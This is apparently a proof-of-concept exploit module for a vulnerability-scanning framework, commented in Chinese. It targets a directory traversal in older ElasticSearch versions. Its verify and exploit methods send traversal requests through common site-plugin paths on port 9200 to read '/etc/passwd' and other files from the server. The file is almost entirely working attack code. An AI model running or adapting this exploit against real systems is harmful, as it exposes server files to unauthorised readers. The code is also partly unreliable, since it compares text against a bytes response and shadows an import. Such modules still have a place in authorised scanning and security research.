# coding: utf-8
import requests
import urllib.parse


from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ElasticSearch_0101'  # 平台漏洞编号，留空
    name = 'ElasticSearch < 1.4.5 / < 1.5.2 任意文件读取 Exploit'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_OPERATION  # 漏洞类型
    disclosure_date = '2015-05-21'  # 漏洞公布时间
    desc = '''
    Directory traversal vulnerability in ElasticSearch before 1.4.5 and 1.5.x before 1.5.2,
    when a site plugin is enabled, allows remote attackers to read arbitrary files via unspecified vectors.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ElasticSearch'  # 漏洞应用名称
    product_version = '1.5.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1822c818-442c-4c30-8491-e3d766ed1109'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            pluginList = ['test', 'kopf', 'HQ', 'marvel', 'bigdesk', 'head']
            target = urllib.parse.urlparse(self.target)
            for plugin in pluginList:
                es_test = '%s://%s:9200/_plugin/%s/../../../bin/elasticsearch' % \
                    (target.scheme, target.netloc, plugin)
                verify_url = '%s://%s:9200/_plugin/%s/../../../../../../etc/passwd' % \
                    (target.scheme, target.netloc, plugin)
                response = requests.get(
                    es_test, timeout=8, allow_redirects=False)
                if "ES_JAVA_OPTS" in response.content:
                    req = requests.get(verify_url, timeout=8)
                    if req.status_code == 200:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            pluginList = ['test', 'kopf', 'HQ', 'marvel', 'bigdesk', 'head']
            target = urllib.parse.urlparse(self.target)
            for plugin in pluginList:
                es_test = '%s://%s:9200/_plugin/%s/../../../bin/elasticsearch' % \
                    (target.scheme, target.netloc, plugin)
                verify_url = '%s://%s:9200/_plugin/%s/../../../../../../etc/passwd' % \
                    (target.scheme, target.netloc, plugin)
                response = requests.get(
                    es_test, timeout=8, allow_redirects=False)
                if "ES_JAVA_OPTS" in response.content:
                    req = requests.get(verify_url, timeout=8)
                    if req.status_code == 200:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息：vul_url={verify_url}'.format(
                            target=self.target, name=self.vuln.name, verify_url=verify_url))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
